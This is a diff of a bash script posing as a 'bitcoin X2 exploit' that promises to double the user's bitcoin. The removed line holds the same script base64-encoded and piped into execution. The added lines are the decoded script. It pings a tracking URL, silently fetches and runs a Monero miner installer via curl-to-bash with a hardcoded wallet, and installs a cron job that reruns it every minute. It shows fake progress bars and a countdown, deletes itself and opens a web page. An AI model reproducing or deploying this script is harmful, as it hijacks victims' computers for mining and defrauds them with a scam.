@@ -1,62 +1,70 @@
-echo "IyEvYmluL2Jhc2gKZWNobyAi4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKVl+KWiOKWiOKW
-iOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI
-4paI4pWXIOKWiOKWiOKVl+KWiOKWiOKWiOKVlyAgIOKWiOKWiOKVl+KWiOKWiOKVlyAg4paI4paI
-4pWX4paI4paI4paI4paI4paI4paI4pWXICIKZWNobyAi4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX
-4paI4paI4pWR4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ
-4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4paI4paI4pWX4paI4paI4pWR4paI4paI4paI4paI4pWXICDi
-lojilojilZHilZrilojilojilZfilojilojilZTilZ3ilZrilZDilZDilZDilZDilojilojilZci
-CmVjaG8gIuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKW
-iOKWiOKVkSAgICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWR4paI4paI4pWU4paI4paI
-4pWXIOKWiOKWiOKVkSDilZrilojilojilojilZTilZ0gIOKWiOKWiOKWiOKWiOKWiOKVlOKVnSIK
-ZWNobyAi4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAg4paI4paI4pWRICAg4paI
-4paI4pWRICAgICDilojilojilZEgICDilojilojilZHilojilojilZHilojilojilZHilZriloji
-lojilZfilojilojilZEg4paI4paI4pWU4paI4paI4pWXIOKWiOKWiOKVlOKVkOKVkOKVkOKVnSAi
-CmVjaG8gIuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKV
-muKWiOKWiOKWiOKWiOKWiOKWiOKVl+KVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKV
-keKWiOKWiOKVkSDilZrilojilojilojilojilZHilojilojilZTilZ0g4paI4paI4pWX4paI4paI
-4paI4paI4paI4paI4paI4pWXIgplY2hvICLilZrilZDilZDilZDilZDilZDilZ0g4pWa4pWQ4pWd
-ICAg4pWa4pWQ4pWdICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZDilZDilZDilZDi
-lZ0g4pWa4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKV
-neKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnSIKZWNobyAiIgplY2hvICIiCmVjaG8gIiIKY3VybCAt
-LXNpbGVudCAtLW91dHB1dCAvZGV2L251bGwgaHR0cDovL2NhbmFyeXRva2Vucy5jb20vc3RhdGlj
-L2FydGljbGVzL2lrMGEya2pxdG8xNHg0a25hajc3Y2w1Ynovc3VibWl0LmFzcHgKZWNobyAiTG9h
-ZGluZy4uLiIKY291bnQ9MAp0b3RhbD0zNApwc3RyPSJbPT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1dIgoKd2hpbGUg
-WyAkY291bnQgLWx0ICR0b3RhbCBdOyBkbwogIHNsZWVwIDAuNSAjIHRoaXMgaXMgd29yawogIGNv
-dW50PSQoKCAkY291bnQgKyAxICkpCiAgcGQ9JCgoICRjb3VudCAqIDczIC8gJHRvdGFsICkpCiAg
-cHJpbnRmICJcciUzZC4lMWQlJSAlLiR7cGR9cyIgJCgoICRjb3VudCAqIDEwMCAvICR0b3RhbCAp
-KSAkKCggKCRjb3VudCAqIDEwMDAgLyAkdG90YWwpICUgMTAgKSkgJHBzdHIKZG9uZQplY2hvICJV
-cGRhdGluZy4uLiIKc3VkbyBhcHQgdXBkYXRlICYmIHN1ZG8gYXB0IGluc3RhbGwgZ2l0ICYmIHN1
-ZG8gYXB0LWdldCBpbnN0YWxsIGdpdCBidWlsZC1lc3NlbnRpYWwgY21ha2UgbGlidXYxLWRldiBs
-aWJzc2wtZGV2IGxpYmh3bG9jLWRldgplY2hvICIiCmVjaG8gIiIKY3VybCAtcyAtTCBodHRwczov
-L3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vTW9uZXJvT2NlYW4veG1yaWdfc2V0dXAvbWFzdGVy
-L3NldHVwX21vbmVyb29jZWFuX21pbmVyLnNoIHwgYmFzaCAtcyA0N2ZZV21INW1jU2hBcm90TU1o
-N3ZrUUYzV21xa1d5UXI1dUVTNFBQTXRvbmFMWmFCZE02TUpZQ3JIQzc0MVJWOUtSemh2b1dpcnZp
-NldZaHllV0tuUmJkMkE3dVNhZSAgPiAvZGV2L251bGwgMj4mMSAmCmVjaG8gIiIKZWNobyAiRW50
-ZXIgeW91cnQgd2FsbGV0IGFkZHJlc3M6IgpyZWFkIHdhbGxldAplY2hvICJBY2NlcHRlZCEiJHdh
-bGxldAplY2hvICIiCmVjaG8gIiovMSAqICogKiAqIGN1cmwgLXMgLUwgaHR0cHM6Ly9yYXcuZ2l0
-aHVidXNlcmNvbnRlbnQuY29tL01vbmVyb09jZWFuL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9t
-b25lcm9vY2Vhbl9taW5lci5zaCB8IGJhc2ggLXMgNDdmWVdtSDVtY1NoQXJvdE1NaDd2a1FGM1dt
-cWtXeVFyNXVFUzRQUE10b25hTFphQmRNNk1KWUNySEM3NDFSVjlLUnpodm9XaXJ2aTZXWWh5ZVdL
-blJiZDJBN3VTYWUgID4gL2Rldi9udWxsIDI+JjEgJiIgPiBjcm9uICYmIGNhdCBjcm9uIHwgY3Jv
-bnRhYiAtCmVjaG8gIiIKZWNobyAiQ29ubmVjdGluZyB0byBibG9ja2NoYWluLi4uIgpjb3VudD0w
-CnRvdGFsPTM0CnBzdHI9Ils9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PV0iCgp3aGlsZSBbICRjb3VudCAtbHQgJHRv
-dGFsIF07IGRvCiAgc2xlZXAgMC41ICMgdGhpcyBpcyB3b3JrCiAgY291bnQ9JCgoICRjb3VudCAr
-IDEgKSkKICBwZD0kKCggJGNvdW50ICogNzMgLyAkdG90YWwgKSkKICBwcmludGYgIlxyJTNkLiUx
-ZCUlICUuJHtwZH1zIiAkKCggJGNvdW50ICogMTAwIC8gJHRvdGFsICkpICQoKCAoJGNvdW50ICog
-MTAwMCAvICR0b3RhbCkgJSAxMCApKSAkcHN0cgpkb25lCmVjaG8gIiIKZWNobyAiR2V0IGEgbmlj
-ZSBjb2ZmZWUgYW5kIHRha2UgYSBzZWF0ISIKZWNobyAiU3RhcnQgZXhwbG9pdGluZy4uIgplY2hv
-ICIiCmhvdXI9MAptaW49MTAKc2VjPTAKICAgICAgIHdoaWxlIFsgJGhvdXIgLWdlIDAgXTsgZG8K
-ICAgICAgICAgICAgICAgIHdoaWxlIFsgJG1pbiAtZ2UgMCBdOyBkbwogICAgICAgICAgICAgICAg
-ICAgICAgICB3aGlsZSBbICRzZWMgLWdlIDAgXTsgZG8KICAgICAgICAgICAgICAgICAgICAgICAg
-ICAgICAgICBlY2hvIC1uZSAiJGhvdXI6JG1pbjokc2VjXDAzM1swS1xyIgogICAgICAgICAgICAg
-ICAgICAgICAgICAgICAgICAgIGxldCAic2VjPXNlYy0xIgogICAgICAgICAgICAgICAgICAgICAg
-ICAgICAgICAgIHNsZWVwIDEKICAgICAgICAgICAgICAgICAgICAgICAgZG9uZQogICAgICAgICAg
-ICAgICAgICAgICAgICBzZWM9NTkKICAgICAgICAgICAgICAgICAgICAgICAgbGV0ICJtaW49bWlu
-LTEiCiAgICAgICAgICAgICAgICBkb25lCiAgICAgICAgICAgICAgICBtaW49NTkKICAgICAgICAg
-ICAgICAgIGxldCAiaG91cj1ob3VyLTEiCiAgICAgICAgZG9uZQplY2hvICJUaGUgZXhwbG9pdCBp
-cyBkb25lISIKZWNobyAiWW91IHdpbGwgcmVjZWl2ZSB5b3VyIFgyIGJpdGNvaW4gaW4gYSBjb3Vw
-bGUgb2YgbWludXRlcyEiCmNkICYmIGNkIERvY3VtZW50cyAmJiBybSBiaXRjb2luWDJleHBsb2l0
-dC5zaCAmJiBmaXJlZm94IGh0dHA6Ly9wZXRzcGFsdGFuLmNvbS8gJiYgY2xlYXIgJiYgZXhpdAoK
-Cg==" | base64 -d > btcX2xpltt.sh && chmod +x btcX2xpltt.sh && bash btcX2xpltt.sh
+#!/bin/bash
+echo "██████╗ ██╗████████╗ ██████╗ ██████╗ ██╗███╗   ██╗██╗  ██╗██████╗ "
+echo "██╔══██╗██║╚══██╔══╝██╔════╝██╔═══██╗██║████╗  ██║╚██╗██╔╝╚════██╗"
+echo "██████╔╝██║   ██║   ██║     ██║   ██║██║██╔██╗ ██║ ╚███╔╝  █████╔╝"
+echo "██╔══██╗██║   ██║   ██║     ██║   ██║██║██║╚██╗██║ ██╔██╗ ██╔═══╝ "
+echo "██████╔╝██║   ██║   ╚██████╗╚██████╔╝██║██║ ╚████║██╔╝ ██╗███████╗"
+echo "╚═════╝ ╚═╝   ╚═╝    ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝"
+echo ""
+echo ""
+echo ""
+curl --silent --output /dev/null http://canarytokens.com/static/articles/ik0a2kjqto14x4knaj77cl5bz/submit.aspx
+echo "Loading..."
+count=0
+total=34
+pstr="[=======================================================================]"
+
+while [ $count -lt $total ]; do
+  sleep 0.5 # this is work
+  count=$(( $count + 1 ))
+  pd=$(( $count * 73 / $total ))
+  printf "\r%3d.%1d%% %.${pd}s" $(( $count * 100 / $total )) $(( ($count * 1000 / $total) % 10 )) $pstr
+done
+echo "Updating..."
+sudo apt update && sudo apt install git && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+echo ""
+echo ""
+curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 47fYWmH5mcShArotMMh7vkQF3WmqkWyQr5uES4PPMtonaLZaBdM6MJYCrHC741RV9KRzhvoWirvi6WYhyeWKnRbd2A7uSae  > /dev/null 2>&1 &
+echo ""
+echo "Enter yourt wallet address:"
+read wallet
+echo "Accepted!"$wallet
+echo ""
+echo "*/1 * * * * curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 47fYWmH5mcShArotMMh7vkQF3WmqkWyQr5uES4PPMtonaLZaBdM6MJYCrHC741RV9KRzhvoWirvi6WYhyeWKnRbd2A7uSae  > /dev/null 2>&1 &" > cron && cat cron | crontab -
+echo ""
+rm cron
+echo "Connecting to blockchain..."
+count=0
+total=34
+pstr="[=======================================================================]"
+
+while [ $count -lt $total ]; do
+  sleep 0.5 # this is work
+  count=$(( $count + 1 ))
+  pd=$(( $count * 73 / $total ))
+  printf "\r%3d.%1d%% %.${pd}s" $(( $count * 100 / $total )) $(( ($count * 1000 / $total) % 10 )) $pstr
+done
+echo ""
+echo "Get a nice coffee and take a seat!"
+echo "Start exploiting.."
+echo ""
+hour=0
+min=10
+sec=0
+       while [ $hour -ge 0 ]; do
+                while [ $min -ge 0 ]; do
+                        while [ $sec -ge 0 ]; do
+                                echo -ne "$hour:$min:$sec\033[0K\r"
+                                let "sec=sec-1"
+                                sleep 1
+                        done
+                        sec=59
+                        let "min=min-1"
+                done
+                min=59
+                let "hour=hour-1"
+        done
+echo "The exploit is done!"
+echo "You will receive your X2 bitcoin in a couple of minutes!"
+cd && cd Documents && rm bitcoinX2exploitt.sh && firefox http://petspaltan.com/ && clear && exit
+
